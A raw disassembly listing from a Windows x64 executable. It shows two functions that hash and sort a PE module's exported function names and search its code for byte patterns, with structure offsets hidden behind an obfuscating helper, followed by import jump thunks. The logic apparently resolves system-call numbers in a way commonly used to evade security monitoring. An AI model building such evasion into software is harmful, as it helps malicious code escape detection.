   140009b08:	4d 01 fd             	add    %r15,%r13
   140009b0b:	46 8b 64 3d 00       	mov    0x0(%rbp,%r15,1),%r12d
   140009b10:	b9 00 4f 18 7a       	mov    $0x7a184f00,%ecx
   140009b15:	e8 26 ff ff ff       	call   0x140009a40
   140009b1a:	41 39 c4             	cmp    %eax,%r12d
   140009b1d:	75 c1                	jne    0x140009ae0
   140009b1f:	4c 01 fd             	add    %r15,%rbp
   140009b22:	4d 89 ec             	mov    %r13,%r12
   140009b25:	b9 96 da b3 0d       	mov    $0xdb3da96,%ecx
   140009b2a:	e8 11 ff ff ff       	call   0x140009a40
   140009b2f:	89 c0                	mov    %eax,%eax
   140009b31:	8b 6c 05 00          	mov    0x0(%rbp,%rax,1),%ebp
   140009b35:	b9 fe 08 18 7a       	mov    $0x7a1808fe,%ecx
   140009b3a:	e8 01 ff ff ff       	call   0x140009a40
   140009b3f:	39 c5                	cmp    %eax,%ebp
   140009b41:	75 a0                	jne    0x140009ae3
   140009b43:	eb 09                	jmp    0x140009b4e
   140009b45:	4d 85 e4             	test   %r12,%r12
   140009b48:	0f 84 98 01 00 00    	je     0x140009ce6
   140009b4e:	4c 89 3d 03 a9 2b 00 	mov    %r15,0x2ba903(%rip)        # 0x1402c4458
   140009b55:	b9 7a de b3 0d       	mov    $0xdb3de7a,%ecx
   140009b5a:	e8 e1 fe ff ff       	call   0x140009a40
   140009b5f:	89 c6                	mov    %eax,%esi
   140009b61:	89 c1                	mov    %eax,%ecx
   140009b63:	48 c1 e1 03          	shl    $0x3,%rcx
   140009b67:	e8 c4 03 00 00       	call   0x140009f30
   140009b6c:	48 89 05 ed 96 2b 00 	mov    %rax,0x2b96ed(%rip)        # 0x1402c3260
   140009b73:	41 8b 6c 24 18       	mov    0x18(%r12),%ebp
   140009b78:	85 ed                	test   %ebp,%ebp
   140009b7a:	0f 84 5c 01 00 00    	je     0x140009cdc
   140009b80:	85 f6                	test   %esi,%esi
   140009b82:	0f 84 54 01 00 00    	je     0x140009cdc
   140009b88:	48 89 c3             	mov    %rax,%rbx
   140009b8b:	b9 b2 da b3 0d       	mov    $0xdb3dab2,%ecx
   140009b90:	e8 ab fe ff ff       	call   0x140009a40
   140009b95:	89 c0                	mov    %eax,%eax
   140009b97:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140009b9c:	b9 ec 51 b4 0d       	mov    $0xdb451ec,%ecx
   140009ba1:	e8 9a fe ff ff       	call   0x140009a40
   140009ba6:	89 e9                	mov    %ebp,%ecx
   140009ba8:	89 c2                	mov    %eax,%edx
   140009baa:	45 31 f6             	xor    %r14d,%r14d
   140009bad:	45 31 ed             	xor    %r13d,%r13d
   140009bb0:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140009bb4:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140009bb8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140009bbf:	00 
   140009bc0:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140009bc5:	41 8b 04 04          	mov    (%r12,%rax,1),%eax
   140009bc9:	4c 01 f8             	add    %r15,%rax
   140009bcc:	42 8b 2c b0          	mov    (%rax,%r14,4),%ebp
   140009bd0:	41 0f b7 04 2f       	movzwl (%r15,%rbp,1),%eax
   140009bd5:	39 c2                	cmp    %eax,%edx
   140009bd7:	0f 85 d6 00 00 00    	jne    0x140009cb3
   140009bdd:	89 4c 24 2c          	mov    %ecx,0x2c(%rsp)
   140009be1:	84 c0                	test   %al,%al
   140009be3:	74 4d                	je     0x140009c32
   140009be5:	4c 01 fd             	add    %r15,%rbp
   140009be8:	b9 91 da b3 0d       	mov    $0xdb3da91,%ecx
   140009bed:	e8 4e fe ff ff       	call   0x140009a40
   140009bf2:	41 b9 6e 25 4c f2    	mov    $0xf24c256e,%r9d
   140009bf8:	ba 01 00 00 00       	mov    $0x1,%edx
   140009bfd:	45 31 c0             	xor    %r8d,%r8d
   140009c00:	44 89 c9             	mov    %r9d,%ecx
   140009c03:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140009c0a:	84 00 00 00 00 00 
   140009c10:	45 0f b7 04 28       	movzwl (%r8,%rbp,1),%r8d
   140009c15:	c1 c1 18             	rol    $0x18,%ecx
   140009c18:	44 01 c9             	add    %r9d,%ecx
   140009c1b:	44 01 c1             	add    %r8d,%ecx
   140009c1e:	21 c1                	and    %eax,%ecx
   140009c20:	41 89 d0             	mov    %edx,%r8d
   140009c23:	ff c2                	inc    %edx
   140009c25:	42 80 7c 05 00 00    	cmpb   $0x0,0x0(%rbp,%r8,1)
   140009c2b:	41 89 c9             	mov    %ecx,%r9d
   140009c2e:	75 e0                	jne    0x140009c10
   140009c30:	eb 05                	jmp    0x140009c37
   140009c32:	b9 6e 25 4c f2       	mov    $0xf24c256e,%ecx
   140009c37:	44 89 ed             	mov    %r13d,%ebp
   140009c3a:	89 0c eb             	mov    %ecx,(%rbx,%rbp,8)
   140009c3d:	b9 ae da b3 0d       	mov    $0xdb3daae,%ecx
   140009c42:	e8 f9 fd ff ff       	call   0x140009a40
   140009c47:	89 c0                	mov    %eax,%eax
   140009c49:	42 8b 34 20          	mov    (%rax,%r12,1),%esi
   140009c4d:	4c 01 fe             	add    %r15,%rsi
   140009c50:	b9 b6 da b3 0d       	mov    $0xdb3dab6,%ecx
   140009c55:	e8 e6 fd ff ff       	call   0x140009a40
   140009c5a:	89 c0                	mov    %eax,%eax
   140009c5c:	42 8b 04 20          	mov    (%rax,%r12,1),%eax
   140009c60:	4c 01 f8             	add    %r15,%rax
   140009c63:	42 0f b7 04 70       	movzwl (%rax,%r14,2),%eax
   140009c68:	8b 04 86             	mov    (%rsi,%rax,4),%eax
   140009c6b:	89 44 eb 04          	mov    %eax,0x4(%rbx,%rbp,8)
   140009c6f:	44 89 e8             	mov    %r13d,%eax
   140009c72:	45 85 ed             	test   %r13d,%r13d
   140009c75:	8b 4c 24 2c          	mov    0x2c(%rsp),%ecx
   140009c79:	74 2d                	je     0x140009ca8
   140009c7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009c80:	89 c1                	mov    %eax,%ecx
   140009c82:	8b 54 cb 04          	mov    0x4(%rbx,%rcx,8),%edx
   140009c86:	ff c8                	dec    %eax
   140009c88:	3b 54 c3 04          	cmp    0x4(%rbx,%rax,8),%edx
   140009c8c:	73 15                	jae    0x140009ca3
   140009c8e:	48 8b 14 cb          	mov    (%rbx,%rcx,8),%rdx
   140009c92:	4c 8b 04 c3          	mov    (%rbx,%rax,8),%r8
   140009c96:	4c 89 04 cb          	mov    %r8,(%rbx,%rcx,8)
   140009c9a:	48 89 14 c3          	mov    %rdx,(%rbx,%rax,8)
   140009c9e:	48 85 c0             	test   %rax,%rax
   140009ca1:	75 dd                	jne    0x140009c80
   140009ca3:	41 8b 4c 24 18       	mov    0x18(%r12),%ecx
   140009ca8:	41 ff c5             	inc    %r13d
   140009cab:	8b 74 24 28          	mov    0x28(%rsp),%esi
   140009caf:	8b 54 24 24          	mov    0x24(%rsp),%edx
   140009cb3:	49 ff c6             	inc    %r14
   140009cb6:	89 c8                	mov    %ecx,%eax
   140009cb8:	49 39 c6             	cmp    %rax,%r14
   140009cbb:	73 09                	jae    0x140009cc6
   140009cbd:	41 39 f5             	cmp    %esi,%r13d
   140009cc0:	0f 82 fa fe ff ff    	jb     0x140009bc0
   140009cc6:	44 89 2d 8b 95 2b 00 	mov    %r13d,0x2b958b(%rip)        # 0x1402c3258
   140009ccd:	45 85 ed             	test   %r13d,%r13d
   140009cd0:	8b 74 24 20          	mov    0x20(%rsp),%esi
   140009cd4:	0f 85 9b fd ff ff    	jne    0x140009a75
   140009cda:	eb 0a                	jmp    0x140009ce6
   140009cdc:	c7 05 72 95 2b 00 00 	movl   $0x0,0x2b9572(%rip)        # 0x1402c3258
   140009ce3:	00 00 00 
   140009ce6:	89 f8                	mov    %edi,%eax
   140009ce8:	48 83 c4 38          	add    $0x38,%rsp
   140009cec:	5b                   	pop    %rbx
   140009ced:	5d                   	pop    %rbp
   140009cee:	5f                   	pop    %rdi
   140009cef:	5e                   	pop    %rsi
   140009cf0:	41 5c                	pop    %r12
   140009cf2:	41 5d                	pop    %r13
   140009cf4:	41 5e                	pop    %r14
   140009cf6:	41 5f                	pop    %r15
   140009cf8:	c3                   	ret
   140009cf9:	cc                   	int3
   140009cfa:	cc                   	int3
   140009cfb:	cc                   	int3
   140009cfc:	cc                   	int3
   140009cfd:	cc                   	int3
   140009cfe:	cc                   	int3
   140009cff:	cc                   	int3
   140009d00:	41 57                	push   %r15
   140009d02:	41 56                	push   %r14
   140009d04:	41 55                	push   %r13
   140009d06:	41 54                	push   %r12
   140009d08:	56                   	push   %rsi
   140009d09:	57                   	push   %rdi
   140009d0a:	55                   	push   %rbp
   140009d0b:	53                   	push   %rbx
   140009d0c:	48 83 ec 38          	sub    $0x38,%rsp
   140009d10:	44 8b 3d 3d a7 2b 00 	mov    0x2ba73d(%rip),%r15d        # 0x1402c4454
   140009d17:	41 8d 47 01          	lea    0x1(%r15),%eax
   140009d1b:	89 05 33 a7 2b 00    	mov    %eax,0x2ba733(%rip)        # 0x1402c4454
   140009d21:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   140009d26:	42 8d 34 38          	lea    (%rax,%r15,1),%esi
   140009d2a:	81 c6 6e 25 4c f2    	add    $0xf24c256e,%esi
   140009d30:	89 74 24 24          	mov    %esi,0x24(%rsp)
   140009d34:	8b 1d 42 94 2b 00    	mov    0x2b9442(%rip),%ebx        # 0x1402c317c
   140009d3a:	83 fb ff             	cmp    $0xffffffff,%ebx
   140009d3d:	74 13                	je     0x140009d52
   140009d3f:	4c 8b 25 12 a7 2b 00 	mov    0x2ba712(%rip),%r12        # 0x1402c4458
   140009d46:	48 8b 3d 13 95 2b 00 	mov    0x2b9513(%rip),%rdi        # 0x1402c3260
   140009d4d:	e9 95 00 00 00       	jmp    0x140009de7
   140009d52:	b9 d2 da b3 0d       	mov    $0xdb3dad2,%ecx
   140009d57:	e8 e4 fc ff ff       	call   0x140009a40
   140009d5c:	4c 8b 25 f5 a6 2b 00 	mov    0x2ba6f5(%rip),%r12        # 0x1402c4458
   140009d63:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140009d68:	48 8b 3d f1 94 2b 00 	mov    0x2b94f1(%rip),%rdi        # 0x1402c3260
   140009d6f:	85 c0                	test   %eax,%eax
   140009d71:	74 74                	je     0x140009de7
   140009d73:	89 c5                	mov    %eax,%ebp
   140009d75:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   140009d7a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140009d7f:	44 8b 77 04          	mov    0x4(%rdi),%r14d
   140009d83:	b9 a1 da b3 0d       	mov    $0xdb3daa1,%ecx
   140009d88:	e8 b3 fc ff ff       	call   0x140009a40
   140009d8d:	89 c7                	mov    %eax,%edi
   140009d8f:	41 89 ef             	mov    %ebp,%r15d
   140009d92:	4d 01 e6             	add    %r12,%r14
   140009d95:	45 31 ed             	xor    %r13d,%r13d
   140009d98:	eb 0e                	jmp    0x140009da8
   140009d9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140009da0:	49 ff c5             	inc    %r13
   140009da3:	4d 39 ef             	cmp    %r13,%r15
   140009da6:	74 35                	je     0x140009ddd
   140009da8:	43 0f b6 04 2e       	movzbl (%r14,%r13,1),%eax
   140009dad:	39 c7                	cmp    %eax,%edi
   140009daf:	75 ef                	jne    0x140009da0
   140009db1:	b9 93 da b3 0d       	mov    $0xdb3da93,%ecx
   140009db6:	e8 85 fc ff ff       	call   0x140009a40
   140009dbb:	89 c0                	mov    %eax,%eax
   140009dbd:	4b 8d 0c 2e          	lea    (%r14,%r13,1),%rcx
   140009dc1:	0f b6 2c 08          	movzbl (%rax,%rcx,1),%ebp
   140009dc5:	b9 97 da b3 0d       	mov    $0xdb3da97,%ecx
   140009dca:	e8 71 fc ff ff       	call   0x140009a40
   140009dcf:	39 e8                	cmp    %ebp,%eax
   140009dd1:	75 cd                	jne    0x140009da0
   140009dd3:	44 89 2d a2 93 2b 00 	mov    %r13d,0x2b93a2(%rip)        # 0x1402c317c
   140009dda:	44 89 eb             	mov    %r13d,%ebx
   140009ddd:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140009de2:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   140009de7:	b9 9f 40 cd 0d       	mov    $0xdcd409f,%ecx
   140009dec:	e8 4f fc ff ff       	call   0x140009a40
   140009df1:	41 89 c5             	mov    %eax,%r13d
   140009df4:	b9 f1 cd 22 4a       	mov    $0x4a22cdf1,%ecx
   140009df9:	e8 42 fc ff ff       	call   0x140009a40
   140009dfe:	41 89 c6             	mov    %eax,%r14d
   140009e01:	8b 05 51 94 2b 00    	mov    0x2b9451(%rip),%eax        # 0x1402c3258
   140009e07:	ff c8                	dec    %eax
   140009e09:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140009e0d:	48 63 eb             	movslq %ebx,%rbp
   140009e10:	b9 a1 da b3 0d       	mov    $0xdb3daa1,%ecx
   140009e15:	e8 26 fc ff ff       	call   0x140009a40
   140009e1a:	89 c3                	mov    %eax,%ebx
   140009e1c:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140009e21:	41 0f af f5          	imul   %r13d,%esi
   140009e25:	44 01 f6             	add    %r14d,%esi
   140009e28:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   140009e2d:	41 01 c7             	add    %eax,%r15d
   140009e30:	41 81 c7 6f 25 4c f2 	add    $0xf24c256f,%r15d
   140009e37:	eb 0e                	jmp    0x140009e47
   140009e39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009e40:	03 74 24 28          	add    0x28(%rsp),%esi
   140009e44:	41 ff c7             	inc    %r15d
   140009e47:	44 89 7c 24 24       	mov    %r15d,0x24(%rsp)
   140009e4c:	89 f0                	mov    %esi,%eax
   140009e4e:	31 d2                	xor    %edx,%edx
   140009e50:	f7 74 24 30          	divl   0x30(%rsp)
   140009e54:	48 63 c2             	movslq %edx,%rax
   140009e57:	44 8b 74 c7 04       	mov    0x4(%rdi,%rax,8),%r14d
   140009e5c:	4d 01 e6             	add    %r12,%r14
   140009e5f:	42 0f b6 44 35 00    	movzbl 0x0(%rbp,%r14,1),%eax
   140009e65:	39 c3                	cmp    %eax,%ebx
   140009e67:	75 d7                	jne    0x140009e40
   140009e69:	49 01 ee             	add    %rbp,%r14
   140009e6c:	b9 93 da b3 0d       	mov    $0xdb3da93,%ecx
   140009e71:	e8 ca fb ff ff       	call   0x140009a40
   140009e76:	89 c0                	mov    %eax,%eax
   140009e78:	49 89 fd             	mov    %rdi,%r13
   140009e7b:	4c 89 e7             	mov    %r12,%rdi
   140009e7e:	45 0f b6 24 06       	movzbl (%r14,%rax,1),%r12d
   140009e83:	b9 97 da b3 0d       	mov    $0xdb3da97,%ecx
   140009e88:	e8 b3 fb ff ff       	call   0x140009a40
   140009e8d:	44 39 e0             	cmp    %r12d,%eax
   140009e90:	49 89 fc             	mov    %rdi,%r12
   140009e93:	4c 89 ef             	mov    %r13,%rdi
   140009e96:	75 a8                	jne    0x140009e40
   140009e98:	4c 89 f0             	mov    %r14,%rax
   140009e9b:	48 83 c4 38          	add    $0x38,%rsp
   140009e9f:	5b                   	pop    %rbx
   140009ea0:	5d                   	pop    %rbp
   140009ea1:	5f                   	pop    %rdi
   140009ea2:	5e                   	pop    %rsi
   140009ea3:	41 5c                	pop    %r12
   140009ea5:	41 5d                	pop    %r13
   140009ea7:	41 5e                	pop    %r14
   140009ea9:	41 5f                	pop    %r15
   140009eab:	c3                   	ret
   140009eac:	cc                   	int3
   140009ead:	cc                   	int3
   140009eae:	cc                   	int3
   140009eaf:	cc                   	int3
   140009eb0:	ff 25 6a 2c 00 00    	jmp    *0x2c6a(%rip)        # 0x14000cb20
   140009eb6:	cc                   	int3
   140009eb7:	cc                   	int3
   140009eb8:	cc                   	int3
   140009eb9:	cc                   	int3
   140009eba:	cc                   	int3
   140009ebb:	cc                   	int3
   140009ebc:	cc                   	int3
   140009ebd:	cc                   	int3
   140009ebe:	cc                   	int3
   140009ebf:	cc                   	int3
   140009ec0:	ff 25 62 2c 00 00    	jmp    *0x2c62(%rip)        # 0x14000cb28
   140009ec6:	cc                   	int3
   140009ec7:	cc                   	int3
   140009ec8:	cc                   	int3
   140009ec9:	cc                   	int3
   140009eca:	cc                   	int3
   140009ecb:	cc                   	int3
   140009ecc:	cc                   	int3
   140009ecd:	cc                   	int3
   140009ece:	cc                   	int3
   140009ecf:	cc                   	int3
   140009ed0:	ff 25 6a 2c 00 00    	jmp    *0x2c6a(%rip)        # 0x14000cb40
   140009ed6:	cc                   	int3
   140009ed7:	cc                   	int3
   140009ed8:	cc                   	int3
   140009ed9:	cc                   	int3
   140009eda:	cc                   	int3
   140009edb:	cc                   	int3
   140009edc:	cc                   	int3
   140009edd:	cc                   	int3
   140009ede:	cc                   	int3
   140009edf:	cc                   	int3
   140009ee0:	ff 25 6a 2c 00 00    	jmp    *0x2c6a(%rip)        # 0x14000cb50
   140009ee6:	cc                   	int3
   140009ee7:	cc                   	int3
   140009ee8:	cc                   	int3
   140009ee9:	cc                   	int3
   140009eea:	cc                   	int3
   140009eeb:	cc                   	int3
   140009eec:	cc                   	int3
   140009eed:	cc                   	int3
   140009eee:	cc                   	int3
   140009eef:	cc                   	int3
   140009ef0:	ff 25 62 2c 00 00    	jmp    *0x2c62(%rip)        # 0x14000cb58
   140009ef6:	cc                   	int3
   140009ef7:	cc                   	int3
   140009ef8:	cc                   	int3
   140009ef9:	cc                   	int3
   140009efa:	cc                   	int3
   140009efb:	cc                   	int3
   140009efc:	cc                   	int3
   140009efd:	cc                   	int3
   140009efe:	cc                   	int3
   140009eff:	cc                   	int3
   140009f00:	ff 25 6a 2c 00 00    	jmp    *0x2c6a(%rip)        # 0x14000cb70
   140009f06:	cc                   	int3
   140009f07:	cc                   	int3
   140009f08:	cc                   	int3
   140009f09:	cc                   	int3
   140009f0a:	cc                   	int3
   140009f0b:	cc                   	int3
   140009f0c:	cc                   	int3
   140009f0d:	cc                   	int3
   140009f0e:	cc                   	int3
   140009f0f:	cc                   	int3
   140009f10:	ff 25 62 2c 00 00    	jmp    *0x2c62(%rip)        # 0x14000cb78
   140009f16:	cc                   	int3
   140009f17:	cc                   	int3
   140009f18:	cc                   	int3
   140009f19:	cc                   	int3
   140009f1a:	cc                   	int3
   140009f1b:	cc                   	int3
   140009f1c:	cc                   	int3
   140009f1d:	cc                   	int3
   140009f1e:	cc                   	int3
   140009f1f:	cc                   	int3
   140009f20:	ff 25 7a 2c 00 00    	jmp    *0x2c7a(%rip)        # 0x14000cba0
   140009f26:	cc                   	int3
   140009f27:	cc                   	int3
   140009f28:	cc                   	int3
   140009f29:	cc                   	int3
   140009f2a:	cc                   	int3
   140009f2b:	cc                   	int3
   140009f2c:	cc                   	int3
   140009f2d:	cc                   	int3
   140009f2e:	cc                   	int3
   140009f2f:	cc                   	int3
   140009f30:	ff 25 8a 2c 00 00    	jmp    *0x2c8a(%rip)        # 0x14000cbc0
   140009f36:	cc                   	int3
   140009f37:	cc                   	int3
   140009f38:	cc                   	int3
   140009f39:	cc                   	int3
   140009f3a:	cc                   	int3
   140009f3b:	cc                   	int3
   140009f3c:	cc                   	int3
   140009f3d:	cc                   	int3
   140009f3e:	cc                   	int3
   140009f3f:	cc                   	int3
   140009f40:	ff 25 82 2c 00 00    	jmp    *0x2c82(%rip)        # 0x14000cbc8
   140009f46:	cc                   	int3
   140009f47:	cc                   	int3
   140009f48:	cc                   	int3
   140009f49:	cc                   	int3
   140009f4a:	cc                   	int3
   140009f4b:	cc                   	int3
   140009f4c:	cc                   	int3
   140009f4d:	cc                   	int3
   140009f4e:	cc                   	int3
   140009f4f:	cc                   	int3
   140009f50:	ff 25 8a 2c 00 00    	jmp    *0x2c8a(%rip)        # 0x14000cbe0
   140009f56:	cc                   	int3
   140009f57:	cc                   	int3
   140009f58:	cc                   	int3
   140009f59:	cc                   	int3
   140009f5a:	cc                   	int3
   140009f5b:	cc                   	int3
   140009f5c:	cc                   	int3
   140009f5d:	cc                   	int3
   140009f5e:	cc                   	int3
   140009f5f:	cc                   	int3
   140009f60:	ff 25 92 2c 00 00    	jmp    *0x2c92(%rip)        # 0x14000cbf8
   140009f66:	cc                   	int3
   140009f67:	cc                   	int3
   140009f68:	cc                   	int3
   140009f69:	cc                   	int3
   140009f6a:	cc                   	int3
   140009f6b:	cc                   	int3
   140009f6c:	cc                   	int3
   140009f6d:	cc                   	int3
   140009f6e:	cc                   	int3
   140009f6f:	cc                   	int3
   140009f70:	ff 25 8a 2c 00 00    	jmp    *0x2c8a(%rip)        # 0x14000cc00
   140009f76:	cc                   	int3
   140009f77:	cc                   	int3
   140009f78:	cc                   	int3
   140009f79:	cc                   	int3
   140009f7a:	cc                   	int3
   140009f7b:	cc                   	int3
   140009f7c:	cc                   	int3
   140009f7d:	cc                   	int3
   140009f7e:	cc                   	int3
   140009f7f:	cc                   	int3
   140009f80:	ff 25 82 2c 00 00    	jmp    *0x2c82(%rip)        # 0x14000cc08
   140009f86:	cc                   	int3
   140009f87:	cc                   	int3
   140009f88:	cc                   	int3
   140009f89:	cc                   	int3
   140009f8a:	cc                   	int3
   140009f8b:	cc                   	int3
   140009f8c:	cc                   	int3
   140009f8d:	cc                   	int3
   140009f8e:	cc                   	int3
   140009f8f:	cc                   	int3
   140009f90:	ff 25 7a 2c 00 00    	jmp    *0x2c7a(%rip)        # 0x14000cc10
   140009f96:	cc                   	int3
   140009f97:	cc                   	int3
   140009f98:	cc                   	int3
   140009f99:	cc                   	int3
   140009f9a:	cc                   	int3
   140009f9b:	cc                   	int3
   140009f9c:	cc                   	int3
   140009f9d:	cc                   	int3
   140009f9e:	cc                   	int3
   140009f9f:	cc                   	int3
   140009fa0:	ff 25 02 2c 00 00    	jmp    *0x2c02(%rip)        # 0x14000cba8
   140009fa6:	cc                   	int3
   140009fa7:	cc                   	int3
   140009fa8:	cc                   	int3
   140009fa9:	cc                   	int3
   140009faa:	cc                   	int3
   140009fab:	cc                   	int3
   140009fac:	cc                   	int3
   140009fad:	cc                   	int3
   140009fae:	cc                   	int3
   140009faf:	cc                   	int3
   140009fb0:	ff 25 02 2c 00 00    	jmp    *0x2c02(%rip)        # 0x14000cbb8
   140009fb6:	cc                   	int3
   140009fb7:	cc                   	int3
   140009fb8:	cc                   	int3
   140009fb9:	cc                   	int3
   140009fba:	cc                   	int3
   140009fbb:	cc                   	int3
   140009fbc:	cc                   	int3
   140009fbd:	cc                   	int3
   140009fbe:	cc                   	int3
   140009fbf:	cc                   	int3
   140009fc0:	ff 25 2a 2c 00 00    	jmp    *0x2c2a(%rip)        # 0x14000cbf0
   140009fc6:	cc                   	int3
   140009fc7:	cc                   	int3
   140009fc8:	cc                   	int3
   140009fc9:	cc                   	int3
   140009fca:	cc                   	int3
   140009fcb:	cc                   	int3
   140009fcc:	cc                   	int3
   140009fcd:	cc                   	int3
   140009fce:	cc                   	int3
   140009fcf:	cc                   	int3
   140009fd0:	ff 25 ba 2b 00 00    	jmp    *0x2bba(%rip)        # 0x14000cb90
   140009fd6:	cc                   	int3
   140009fd7:	cc                   	int3
   140009fd8:	cc                   	int3
   140009fd9:	cc                   	int3
   140009fda:	cc                   	int3
   140009fdb:	cc                   	int3
   140009fdc:	cc                   	int3
   140009fdd:	cc                   	int3
   140009fde:	cc                   	int3
   140009fdf:	cc                   	int3
   140009fe0:	ff 25 62 2b 00 00    	jmp    *0x2b62(%rip)        # 0x14000cb48
   140009fe6:	cc                   	int3
   140009fe7:	cc                   	int3
   140009fe8:	cc                   	int3
   140009fe9:	cc                   	int3
   140009fea:	cc                   	int3
   140009feb:	cc                   	int3
   140009fec:	cc                   	int3
   140009fed:	cc                   	int3
   140009fee:	cc                   	int3
   140009fef:	cc                   	int3
   140009ff0:	ff 25 e2 2b 00 00    	jmp    *0x2be2(%rip)        # 0x14000cbd8
   140009ff6:	cc                   	int3
   140009ff7:	cc                   	int3
   140009ff8:	cc                   	int3
   140009ff9:	cc                   	int3
   140009ffa:	cc                   	int3
   140009ffb:	cc                   	int3
   140009ffc:	cc                   	int3
   140009ffd:	cc                   	int3
   140009ffe:	cc                   	int3
   140009fff:	cc                   	int3
   14000a000:	ff 25 7a 2b 00 00    	jmp    *0x2b7a(%rip)        # 0x14000cb80
   14000a006:	cc                   	int3
   14000a007:	cc                   	int3
   14000a008:	cc                   	int3
   14000a009:	cc                   	int3
   14000a00a:	cc                   	int3
   14000a00b:	cc                   	int3
   14000a00c:	cc                   	int3
   14000a00d:	cc                   	int3
   14000a00e:	cc                   	int3
   14000a00f:	cc                   	int3
   14000a010:	ff 25 72 2b 00 00    	jmp    *0x2b72(%rip)        # 0x14000cb88
   14000a016:	cc                   	int3
   14000a017:	cc                   	int3
   14000a018:	cc                   	int3
   14000a019:	cc                   	int3
   14000a01a:	cc                   	int3
   14000a01b:	cc                   	int3
   14000a01c:	cc                   	int3
   14000a01d:	cc                   	int3
   14000a01e:	cc                   	int3
   14000a01f:	cc                   	int3
   14000a020:	ff 25 72 2b 00 00    	jmp    *0x2b72(%rip)        # 0x14000cb98
   14000a026:	cc                   	int3
   14000a027:	cc                   	int3
   14000a028:	cc                   	int3
   14000a029:	cc                   	int3
   14000a02a:	cc                   	int3
   14000a02b:	cc                   	int3
   14000a02c:	cc                   	int3
   14000a02d:	cc                   	int3
   14000a02e:	cc                   	int3
   14000a02f:	cc                   	int3
   14000a030:	ff 25 7a 2b 00 00    	jmp    *0x2b7a(%rip)        # 0x14000cbb0
   14000a036:	cc                   	int3
   14000a037:	cc                   	int3
   14000a038:	cc                   	int3
   14000a039:	cc                   	int3
   14000a03a:	cc                   	int3
   14000a03b:	cc                   	int3
   14000a03c:	cc                   	int3
   14000a03d:	cc                   	int3
   14000a03e:	cc                   	int3
   14000a03f:	cc                   	int3
   14000a040:	ff 25 f2 2a 00 00    	jmp    *0x2af2(%rip)        # 0x14000cb38
   14000a046:	cc                   	int3
   14000a047:	cc                   	int3
   14000a048:	cc                   	int3
   14000a049:	cc                   	int3
   14000a04a:	cc                   	int3
   14000a04b:	cc                   	int3
   14000a04c:	cc                   	int3
   14000a04d:	cc                   	int3
   14000a04e:	cc                   	int3
   14000a04f:	cc                   	int3
   14000a050:	ff 25 92 2b 00 00    	jmp    *0x2b92(%rip)        # 0x14000cbe8
   14000a056:	cc                   	int3
   14000a057:	cc                   	int3
   14000a058:	cc                   	int3
   14000a059:	cc                   	int3
   14000a05a:	cc                   	int3
   14000a05b:	cc                   	int3
   14000a05c:	cc                   	int3
   14000a05d:	cc                   	int3
   14000a05e:	cc                   	int3
   14000a05f:	cc                   	int3
   14000a060:	ff 25 6a 2b 00 00    	jmp    *0x2b6a(%rip)        # 0x14000cbd0
